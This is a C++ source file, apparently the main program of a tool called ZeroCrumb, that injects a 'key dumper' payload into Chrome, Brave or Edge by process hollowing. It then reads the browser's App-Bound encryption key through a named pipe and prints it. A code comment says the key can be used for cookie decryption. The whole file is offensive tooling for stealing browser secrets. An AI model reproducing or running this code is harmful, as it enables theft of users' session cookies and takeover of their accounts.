#include <iostream>
#include<windows.h>

#include "./src/comm/comm.h"
#include "./src/hollowing/hollowing.h"
#include "./src/config/config.h"
#include "./src/dbg/dbg.h"


int main(int argc, char* argv[])
{

    if (argc < 2) {
        printf("Usage: ZeroCrumb.exe <BROWSER_TYPE>\n");
        return -1;
    }

    // chrome = 0, brave = 1, edge = 2
    DWORD browserType = atoi(argv[1]);

    BrowserPathConfig browserConfig;

    switch (browserType) {
    case BrowserType::Chrome:
        browserConfig = config::chrome;
        break;

    case BrowserType::Brave:
        browserConfig = config::brave;
        break;

    case BrowserType::Edge:
        browserConfig = config::edge;
        break;

    default:
        printf("[-] Invalid Browser Type.\n");
        return -1;
    }
    

    SIZE_T payloadSize;
    PBYTE payload = hollowing::getPayloadBuffer(config::keyDumperPath.c_str(), payloadSize);
    hollowing::hollow(browserConfig.exePath.c_str(), payload, payloadSize);

    printf("[*] Reading ABK From ZeroCrumb Named Pipe...\n");

    Sleep(250);

    HANDLE pipe = comm::connectToPipe();
    PBYTE key = comm::readAppBoundKey(pipe); // can use in cookie decryption code

    if (!key) {
        printf("[-] Failed To Read Key From Zero Crumb Named Pipe.\n");
    }
    else {
        string strKey = dbg::getHexABK(key);

        printf("[+] App Bound Key Address: 0x%p\n", key);
        printf("[+] App Bound Key: %s\n", strKey.c_str());
    }

}
